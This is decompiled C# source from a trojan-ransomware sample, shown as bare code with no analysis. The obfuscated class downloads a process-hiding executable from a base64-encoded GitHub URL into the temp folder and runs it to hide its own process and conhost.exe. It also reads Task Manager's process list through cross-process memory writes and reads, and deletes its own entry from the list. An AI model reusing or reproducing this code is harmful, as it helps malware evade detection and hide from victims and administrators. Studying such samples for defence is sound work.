// Decompiled with JetBrains decompiler
// Type: kuMeqwHpurUBOD.VqpeLWAVRhnNLC
// Assembly: Client-0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3332F4B9-4EB1-4ECC-A637-16FC36F853D6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.Win32.Generic-936a35ca214e9be1438c67a1153c854c28054994ce43f1eed39bb9dc52cb54dd.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace kuMeqwHpurUBOD
{
  internal class VqpeLWAVRhnNLC
  {
    private static volatile bool GOpUwPJJhoDAR = false;
    public static volatile bool FdajeWXBJknwTpa = true;

    public static string hqQrIuISTB()
    {
      BErRpdYOfQAwSr.PKLvCQuQNcTS = IntPtr.Size != 8 ? VqpeLWAVRhnNLC.YqZcZuoKEyRA(new Uri(BErRpdYOfQAwSr.oMKRHTBqYRfOk("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2QzNWhhL1Byb2Nlc3NIaWRlL21hc3Rlci9iaW5zL1Byb2Nlc3NIaWRlMzIuZXhl"))) : VqpeLWAVRhnNLC.YqZcZuoKEyRA(new Uri(BErRpdYOfQAwSr.oMKRHTBqYRfOk("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2QzNWhhL1Byb2Nlc3NIaWRlL21hc3Rlci9iaW5zL1Byb2Nlc3NIaWRlNjQuZXhl")));
      return BErRpdYOfQAwSr.PKLvCQuQNcTS;
    }

    public static string YqZcZuoKEyRA([In] Uri obj0)
    {
      try
      {
        string path2 = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
        new WebClient().DownloadFile(obj0, Path.Combine(Path.GetTempPath(), path2));
        return Path.Combine(Path.GetTempPath(), path2);
      }
      catch
      {
      }
      return string.Empty;
    }

    public static Process nXwKPZSaqfrL([In] string obj0)
    {
      foreach (Process process in Process.GetProcesses())
      {
        if (process.ProcessName.Contains(obj0))
          return process;
      }
      return (Process) null;
    }

    public static void BJvMQPSHzrRdKdx([In] string[] obj0)
    {
      string XMYfRqQvHEQq = VqpeLWAVRhnNLC.hqQrIuISTB();
      if (string.IsNullOrEmpty(XMYfRqQvHEQq))
        return;
      while (true)
      {
        foreach (string str1 in obj0)
        {
          Process process = VqpeLWAVRhnNLC.nXwKPZSaqfrL(str1);
          if (process != null)
          {
            string str2 = process.Id.ToString();
            BErRpdYOfQAwSr.uATAppcKlZ(XMYfRqQvHEQq, str2 + " " + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName));
            BErRpdYOfQAwSr.uATAppcKlZ(XMYfRqQvHEQq, str2 + " " + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) + " *32");
            BErRpdYOfQAwSr.uATAppcKlZ(XMYfRqQvHEQq, str2 + " " + BErRpdYOfQAwSr.oMKRHTBqYRfOk("Y29uaG9zdC5leGU="));
          }
        }
        Thread.Sleep(200);
      }
    }

    [DllImport("kernel32.dll", EntryPoint = "OpenProcess")]
    private static extern IntPtr haYxfVQjZiqs([In] int obj0, [In] bool obj1, [In] uint obj2);

    [DllImport("kernel32.dll", EntryPoint = "VirtualAllocEx", SetLastError = true)]
    private static extern IntPtr SCISGCDTLsF(
      [In] IntPtr obj0,
      [In] IntPtr obj1,
      [In] uint obj2,
      [In] int obj3,
      [In] int obj4);

    [DllImport("kernel32.dll", EntryPoint = "VirtualFreeEx", SetLastError = true)]
    private static extern bool ngboKwqlmZkm([In] IntPtr obj0, [In] IntPtr obj1, [In] uint obj2, [In] int obj3);

    [DllImport("kernel32.dll", EntryPoint = "CloseHandle", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool npXbYQTXAz(IntPtr TbuTKImetuELu);

    [DllImport("kernel32.dll", EntryPoint = "WriteProcessMemory", SetLastError = true)]
    private static extern bool pGNfstVjWpiAcY(
      IntPtr lzaawmJkfxGWuQkQ,
      IntPtr JrMeNvPLbfpw,
      byte[] NXDoxBhnuK,
      uint bOZdIKgsStKky,
      out UIntPtr HepoiBCxom);

    [DllImport("kernel32.dll", EntryPoint = "ReadProcessMemory", SetLastError = true)]
    private static extern bool dcFcejYYPT(
      IntPtr tGoboUUOTzz,
      IntPtr UjGmCGdpbUMUXB,
      [Out] byte[] ayngXxhpxMLHsC,
      int RagTomDgaMuQP,
      out UIntPtr EGdQKgqoOQlW);

    [DllImport("user32.dll", EntryPoint = "GetWindowThreadProcessId", SetLastError = true)]
    private static extern uint VskSvkFydeOKgb(IntPtr CHsDgByRKfZ, out uint mysGHPqIBVV);

    [DllImport("user32.dll", EntryPoint = "SendMessage", CharSet = CharSet.Auto)]
    private static extern IntPtr RgvplBIlwwMeh(
      [In] IntPtr obj0,
      [In] uint obj1,
      [In] IntPtr obj2,
      [In] IntPtr obj3);

    [DllImport("user32.dll", EntryPoint = "FindWindow", SetLastError = true)]
    private static extern IntPtr jwGohtCwLir([In] string obj0, [In] string obj1);

    [DllImport("user32.dll", EntryPoint = "FindWindowEx", SetLastError = true)]
    private static extern IntPtr rpURHGlCAhvfdx(
      [In] IntPtr obj0,
      [In] IntPtr obj1,
      [In] string obj2,
      [In] string obj3);

    private static byte[] qrqNJJHgkslYk([In] object obj0)
    {
      int length = Marshal.SizeOf(obj0);
      byte[] destination = new byte[length];
      IntPtr num = Marshal.AllocHGlobal(length);
      Marshal.StructureToPtr(obj0, num, true);
      Marshal.Copy(num, destination, 0, length);
      Marshal.FreeHGlobal(num);
      return destination;
    }

    private static IntPtr iTmITCTgjdVi([In] uint obj0) => VqpeLWAVRhnNLC.haYxfVQjZiqs(56, false, obj0);

    private static void XOJtpnSZMuheJ([In] IntPtr obj0) => VqpeLWAVRhnNLC.npXbYQTXAz(obj0);

    private static IntPtr pMfEgLRmsrWuLW([In] uint obj0, [In] IntPtr obj1) => VqpeLWAVRhnNLC.SCISGCDTLsF(obj1, IntPtr.Zero, obj0, 12288, 4);

    private static void mPdwcdtbQQLofSb([In] IntPtr obj0, [In] IntPtr obj1, [In] uint obj2) => VqpeLWAVRhnNLC.ngboKwqlmZkm(obj0, obj1, obj2, 32768);

    private static IntPtr lCkfhKaDqpN()
    {
      IntPtr num = VqpeLWAVRhnNLC.jwGohtCwLir("TaskManagerWindow", "Administrador de tareas");
      return !(num == IntPtr.Zero) ? VqpeLWAVRhnNLC.rpURHGlCAhvfdx(VqpeLWAVRhnNLC.rpURHGlCAhvfdx(num, IntPtr.Zero, "#32770", (string) null), IntPtr.Zero, "SysListView32", "Procesos") : VqpeLWAVRhnNLC.rpURHGlCAhvfdx(VqpeLWAVRhnNLC.rpURHGlCAhvfdx(VqpeLWAVRhnNLC.jwGohtCwLir("#32770", "Task Manager"), IntPtr.Zero, "#32770", (string) null), IntPtr.Zero, "SysListView32", "Processes");
    }

    private static IntPtr rryNevEKquHuWa([In] IntPtr obj0) => VqpeLWAVRhnNLC.RgvplBIlwwMeh(obj0, 4100U, IntPtr.Zero, IntPtr.Zero);

    private static void KInUACvNococoHbM([In] IntPtr obj0, [In] IntPtr obj1) => VqpeLWAVRhnNLC.RgvplBIlwwMeh(obj0, 4104U, obj1, IntPtr.Zero);

    private static void celsIwgRLunq([In] IntPtr obj0) => VqpeLWAVRhnNLC.RgvplBIlwwMeh(obj0, 4124U, IntPtr.Zero, IntPtr.Zero);

    private static string tuQQOJHNknnhVget([In] IntPtr obj0, [In] IntPtr obj1)
    {
      byte[] numArray = new byte[50];
      VqpeLWAVRhnNLC.wzNlrAKeWkxz structure = new VqpeLWAVRhnNLC.wzNlrAKeWkxz();
      uint mysGHPqIBVV;
      int num1 = (int) VqpeLWAVRhnNLC.VskSvkFydeOKgb(obj0, out mysGHPqIBVV);
      IntPtr num2 = VqpeLWAVRhnNLC.iTmITCTgjdVi(mysGHPqIBVV);
      IntPtr JrMeNvPLbfpw = VqpeLWAVRhnNLC.pMfEgLRmsrWuLW((uint) Marshal.SizeOf<VqpeLWAVRhnNLC.wzNlrAKeWkxz>(structure), num2);
      IntPtr UjGmCGdpbUMUXB = VqpeLWAVRhnNLC.pMfEgLRmsrWuLW(50U, num2);
      structure.WyVileNtCXHIl = obj1;
      structure.mttOVCLpBJ = (IntPtr) 0;
      structure.cOkglSdmswIzt = 50U;
      structure.pOAnexebpFJzHwch = UjGmCGdpbUMUXB;
      UIntPtr num3;
      VqpeLWAVRhnNLC.pGNfstVjWpiAcY(num2, JrMeNvPLbfpw, VqpeLWAVRhnNLC.qrqNJJHgkslYk((object) structure), (uint) Marshal.SizeOf<VqpeLWAVRhnNLC.wzNlrAKeWkxz>(structure), out num3);
      VqpeLWAVRhnNLC.RgvplBIlwwMeh(obj0, 4141U, obj1, JrMeNvPLbfpw);
      VqpeLWAVRhnNLC.dcFcejYYPT(num2, UjGmCGdpbUMUXB, numArray, 50, out num3);
      VqpeLWAVRhnNLC.mPdwcdtbQQLofSb(num2, JrMeNvPLbfpw, (uint) Marshal.SizeOf<VqpeLWAVRhnNLC.wzNlrAKeWkxz>(structure));
      VqpeLWAVRhnNLC.mPdwcdtbQQLofSb(num2, UjGmCGdpbUMUXB, 50U);
      VqpeLWAVRhnNLC.XOJtpnSZMuheJ(num2);
      return Encoding.ASCII.GetString(numArray);
    }

    private static void eEvNlPYjufF([In] string obj0)
    {
      IntPtr num1 = VqpeLWAVRhnNLC.lCkfhKaDqpN();
      if (!(num1 != IntPtr.Zero))
        return;
      int num2 = (int) VqpeLWAVRhnNLC.rryNevEKquHuWa(num1);
      for (int index = 0; index < num2; ++index)
      {
        if (VqpeLWAVRhnNLC.tuQQOJHNknnhVget(num1, (IntPtr) index).Contains(obj0))
          VqpeLWAVRhnNLC.KInUACvNococoHbM(num1, (IntPtr) index);
      }
    }

    private static void nBtpfrHBrxTo()
    {
      IntPtr num = VqpeLWAVRhnNLC.lCkfhKaDqpN();
      if (!(num != IntPtr.Zero))
        return;
      VqpeLWAVRhnNLC.celsIwgRLunq(num);
      VqpeLWAVRhnNLC.celsIwgRLunq(num);
      VqpeLWAVRhnNLC.celsIwgRLunq(num);
      VqpeLWAVRhnNLC.celsIwgRLunq(num);
      VqpeLWAVRhnNLC.celsIwgRLunq(num);
    }

    public static void YPxFSRPJzDpLIv() => new Thread(new ThreadStart(VqpeLWAVRhnNLC.lZqDNWeUuhL)).Start();

    private static void lZqDNWeUuhL()
    {
      while (!VqpeLWAVRhnNLC.GOpUwPJJhoDAR)
      {
        if (VqpeLWAVRhnNLC.FdajeWXBJknwTpa)
        {
          VqpeLWAVRhnNLC.eEvNlPYjufF(Process.GetCurrentProcess().ProcessName + ".exe");
          Thread.Sleep(525);
        }
        else
        {
          VqpeLWAVRhnNLC.nBtpfrHBrxTo();
          Thread.Sleep(1000);
        }
      }
      VqpeLWAVRhnNLC.GOpUwPJJhoDAR = false;
    }

    private struct wzNlrAKeWkxz
    {
      public uint SnAhVkbteStK;
      public IntPtr WyVileNtCXHIl;
      public IntPtr mttOVCLpBJ;
      public uint IpBxasGqhyr;
      public uint MeYPEkpSkdRa;
      public IntPtr pOAnexebpFJzHwch;
      public uint cOkglSdmswIzt;
      public int DrXBzmJRPdne;
      public IntPtr fheVXaLiOMWN;
    }
  }
}
